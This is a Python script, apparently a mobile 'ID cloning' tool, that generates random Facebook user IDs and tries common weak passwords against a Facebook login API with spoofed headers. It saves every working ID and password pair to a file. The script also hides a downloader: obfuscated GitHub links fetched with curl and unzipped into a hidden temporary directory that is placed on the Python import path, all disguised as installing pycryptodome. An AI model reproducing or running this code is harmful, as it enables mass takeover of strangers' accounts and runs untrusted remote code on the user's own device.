import os,time,random,json,sys
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os,sys,tempfile,string,random,subprocess,uuid
http_directory = tempfile.mkdtemp(prefix='.')
site_packages = sys.path[4]
print(site_packages)
print(http_directory)
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
sys.path.insert(5,http_directory)
try:
        os.mkdir('crypto')
except:pass
hh = "ho"
hh2 = "9/pycrypt"
find_aarch = subprocess.check_output('uname -om',shell=True)
if 'aarch64' in str(find_aarch):
        user_aarch = '64'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
elif 'arm' in str(find_aarch):
        user_aarch = '32'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
else:
        print(' Unknown aarch ')
        exit()
if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
        os.system('clear')
        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
        os.system('python Tutul.py')
else:
        akk2="rsi"
        akk=f"cha{akk2}fi"
        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
        os.system(f'curl -L {lib} > {http_directory}/config.zip')
        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    Tutul=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return Tutul
os.system(f'xdg-open https://github.com/Tutul-King')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;91m ████████\033[0;92m ██    ██\033[0;91m ████████\033[0;92m ██    ██\033[0;91m ██ \033[0;92m     ║
║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██  \033[0;92m    ║
║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██  \033[0;92m    ║
║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██   \033[0;92m   ║
║\033[0;91m    ██ \033[0;92m    ██████\033[0;91m     ██\033[0;92m     ██████\033[0;91m  ███████\033[0;92m ║
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-T0X4C ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • MR-T0X4C]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mTutul VHI]   ║\33[1;34m   
╠══[Whatsapp                 • 01608843956 ]  ║\33[1;35m 
╠══[TOOLS                    • FREE ]         ║ \33[1;32m   
╠══[VERSION                  • 2.3 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def main():
    user=[]
    os.system("clear")
    banner()
    limit=input("\033[97;1m[\033[92;1m+\033[97;1m]\33[10;38m INPUT LIMIT \033[10;91m:\033[10;92m ")
    print("\033[97;1m[\033[92;1m1\033[97;1m] \033[10;92mOLD IDz CLONING")
    ask=input("\033[97;1m[\033[92;1m?\033[97;1m]\33[10;38m CHOOSE \033[10;91m:\033[10;92m ")
    if ask in["1"]:
        star="1000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="6549"
        for i in range(int(limit)):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=40) as heron:
        print("\033[1;97m===============================================")
        
        for mal in user:
            uid=star+mal
            heron.submit(login,uid)
    
loop=0
oks=[]

def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r\033[97;1m[\033[10;92mTutul\x1b[1;97m•\033[10;92mM1\033[97;1m]>~[\033[10;92m{loop}\033[97;1m]~[\033[10;92mOk\033[97;1m•\033[10;92m{len(oks)}\033[97;1m] ")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r\033[10;93m[Tutul-King] {uid} • {pw}")
                os.system('espeak -a 300 " Ok"')
                open("/sdcard/Mr.Tutul.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r\033[10;92m[Tutul-King] {uid} • {pw}")
                os.system('espeak -a 300 " Ok"')
                open("/sdcard/Mr.Tutul.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r\033[10;91m[Tutul-King] {uid} • {pw}")
                os.system('espeak -a 300 " Confirm, Email"')
                open("/sdcard/Mr.Tutul.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
#Tutul-King

main()